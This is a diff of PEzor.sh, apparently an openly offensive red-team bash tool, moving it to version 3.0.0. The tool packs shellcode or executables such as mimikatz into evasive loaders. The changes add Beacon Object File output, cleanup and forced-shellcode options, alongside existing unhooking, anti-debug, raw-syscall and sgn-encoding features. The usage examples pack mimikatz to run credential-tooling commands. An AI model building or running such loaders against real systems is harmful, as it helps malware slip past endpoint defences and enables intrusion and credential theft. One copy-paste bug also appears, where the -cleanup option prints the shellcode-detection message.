@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-VERSION="2.1.0"
+VERSION="3.0.0"
 
 cowsay -f dragon 'PEzor!! v'$VERSION 2>/dev/null || echo 'PEzor!! v'$VERSION
 echo '---------------------------------------------------------------------------'
@@ -34,8 +34,10 @@ RX=false
 SDK=4.5
 CC=x86_64-w64-mingw32-clang
 CXX=x86_64-w64-mingw32-clang++
+LD=x86_64-w64-mingw32-ld
 OUTPUT_FORMAT=exe
 OUTPUT_EXTENSION=exe
+CLEANUP=false
 SOURCES=""
 
 usage() {
@@ -59,6 +61,7 @@ OPTIONS
   -rx                       Allocate RX memory for shellcode
   -self                     Execute the shellcode in the same thread
   -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))
+  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
@@ -70,6 +73,10 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (beacon object file)
+  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (beacon object file w/ cleanup)
+  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (reflective dll)
   $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (service exe)
@@ -98,11 +105,13 @@ OPTIONS
   -debug                    Generate a debug build
   -unhook                   User-land hooks removal
   -antidebug                Add anti-debug checks
+  -shellcode                Force shellcode detection
   -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
   -sgn                      Encode the provided shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
   -rx                       Allocate RX memory for shellcode
   -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
+  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
 
@@ -115,6 +124,10 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
+  # 64-bit (beacon object file)
+  $ PEzor.sh -format=bof shellcode.bin
+  # 64-bit (beacon object file w/ cleanup)
+  $ PEzor.sh -format=bof -cleanup shellcode.bin
   # 64-bit (reflective dll)
   $ PEzor.sh -format=reflective-dll shellcode.bin
   # 64-bit (service exe)
@@ -189,6 +202,14 @@ do
             UNHOOK=true
             echo "[?] Unhook enabled"
             ;;
+        -shellcode)
+            IS_SHELLCODE=true
+            echo "[?] Forcing shellcode detection"
+            ;;
+        -cleanup)
+            CLEANUP=true
+            echo "[?] Forcing shellcode detection"
+            ;;
         -sleep=*)
             SLEEP="${arg#*=}"
             echo "[?] Waiting $SLEEP seconds before executing the payload"
@@ -219,8 +240,10 @@ do
     esac
 done
 
-file $BLOB | grep -q ': data' && { IS_SHELLCODE=true; }
-file $BLOB | grep -q ': DOS executable (COM)' && { IS_SHELLCODE=true; } # false positive
+if [ ! $IS_SHELLCODE ]; then
+    file $BLOB | grep -q ': data' && { IS_SHELLCODE=true; }
+    file $BLOB | grep -q ': DOS executable (COM)' && { IS_SHELLCODE=true; } # false positive
+fi
 
 if [ $FORCED_BITS = false ]; then
     file $BLOB | grep -vq 'x86-64' && file $BLOB | grep -q 'PE32' && { BITS=32; }
@@ -233,6 +256,16 @@ fi
 
 if [[ $OUTPUT_FORMAT == dotnet* ]] && [ $SYSCALLS = true ]; then
     echo '[x] Error: cannot inline syscalls when targeting .NET'
+    exit 1
+fi
+
+if [[ $OUTPUT_FORMAT == bof ]] && [ $UNHOOK = true ]; then
+    echo '[x] Error: cannot unhook when targeting BOFs'
+    exit 1
+fi
+
+if [[ $OUTPUT_FORMAT == bof ]] && [ $SELF = true ]; then
+    echo '[x] Error: cannot self-execute when targeting BOFs'
     exit 1
 fi
 
@@ -276,14 +309,22 @@ case $OUTPUT_FORMAT in
         echo '[?] Building .NET executable'
         OUTPUT_EXTENSION=dotnet.exe
         ;;
+    bof)
+        echo '[?] Building Beacon Object File (BOF)'
+        if [ $BITS -eq 32 ]; then
+            OUTPUT_EXTENSION=x86.o
+        else
+            OUTPUT_EXTENSION=x64.o
+        fi
+        ;;
 esac
 
 case $OUTPUT_FORMAT in
-    exe | dll | reflective-dll | service-exe | service-dll)
+    exe | dll | reflective-dll | service-exe | service-dll | bof)
         echo "unsigned int sleep_time = $SLEEP;" > $TMP_DIR/sleep.cpp
         if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
             echo '[?] Executing donut' &&
-            (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1) &&
+            (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1) &&
             echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
             if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
             echo -n 'unsigned char buf[] = "' >> $TMP_DIR/shellcode.cpp &&
@@ -293,7 +334,7 @@ case $OUTPUT_FORMAT in
         else
             if [ $IS_SHELLCODE = false ]; then
                 echo '[?] Executing donut' &&
-                (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1)
+                (donut -i $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1)
             else
                 cp $BLOB $TMP_DIR/shellcode.bin.donut
             fi
@@ -362,6 +403,11 @@ case $OUTPUT_FORMAT in
             CPPFLAGS="$CPPFLAGS -D_TEXT_"
         fi
 
+        if [ $CLEANUP = true ]; then
+            CCFLAGS="$CCFLAGS -D_CLEANUP_"
+            CPPFLAGS="$CPPFLAGS -D_CLEANUP_"
+        fi
+
         if [ $OUTPUT_FORMAT = "dll" ]; then
             CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT"
             CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT"
@@ -372,8 +418,11 @@ case $OUTPUT_FORMAT in
             CCFLAGS="$CCFLAGS -DSERVICE_EXE"
             CPPFLAGS="$CPPFLAGS -DSERVICE_EXE"
         elif [ $OUTPUT_FORMAT = "service-dll" ]; then
-            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL "
+            CCFLAGS="$CCFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
             CPPFLAGS="$CPPFLAGS -shared -DSHAREDOBJECT -DSERVICE_EXE -DSERVICE_DLL"
+        elif [ $OUTPUT_FORMAT = "bof" ]; then
+            CCFLAGS="$CCFLAGS -c -D_BOF_"
+            CPPFLAGS="$CPPFLAGS -c -D_BOF_"
         fi
 
         if [ $OUTPUT_FORMAT = "reflective-dll" ]; then
@@ -391,8 +440,21 @@ case $OUTPUT_FORMAT in
             SOURCES="$SOURCES $TMP_DIR/loader.o"
         fi
 
-        $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/*.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&
-        strip $BLOB.packed.$OUTPUT_EXTENSION || exit 1
+        if [ $OUTPUT_FORMAT = "bof" ]; then
+            # $CXX $CPPFLAGS $CXXFLAGS -Wl,--disable-auto-import -Wl,--disable-runtime-pseudo-reloc $TMP_DIR/shellcode.cpp -c -o $TMP_DIR/shellcode.o
+            # $CXX $CPPFLAGS $CXXFLAGS $TMP_DIR/sleep.cpp -c -o $TMP_DIR/sleep.o &&
+            # $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/inject.cpp -c -o $TMP_DIR/inject.o &&
+            grep -v '#include "inject.hpp"' $INSTALL_DIR/inject.cpp > $TMP_DIR/inject.cpp &&
+            cat $TMP_DIR/{shellcode,sleep}.cpp $INSTALL_DIR/bof.cpp $TMP_DIR/inject.cpp > $TMP_DIR/bof.cpp &&
+            cp $INSTALL_DIR/{sleep,inject,syscalls}.hpp $INSTALL_DIR/beacon.h $TMP_DIR &&
+            mkdir -p $TMP_DIR/deps/inline_syscall/include &&
+            cp $INSTALL_DIR/deps/inline_syscall/include/* $TMP_DIR/deps/inline_syscall/include &&
+            $CXX -mno-stack-arg-probe $CPPFLAGS $CXXFLAGS $TMP_DIR/bof.cpp -c -o $BLOB.packed.$OUTPUT_EXTENSION || exit 1
+            # x86_64-w64-mingw32-ld -r $TMP_DIR/{sleep,bof,inject}.o -o $BLOB.packed.$OUTPUT_EXTENSION
+        else
+            $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/{inject,PEzor}.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&
+            strip $BLOB.packed.$OUTPUT_EXTENSION || exit 1
+        fi
         ;;
     dotnet*)
         echo 'public static class Global {' >> $TMP_DIR/Global.cs &&
